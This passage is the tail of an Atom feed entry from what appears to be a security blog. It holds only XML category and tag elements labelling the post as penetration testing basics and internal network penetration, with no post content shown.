    </summary>
    
      <category term="渗透测试基础" scheme="https://www.mi1k7ea.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
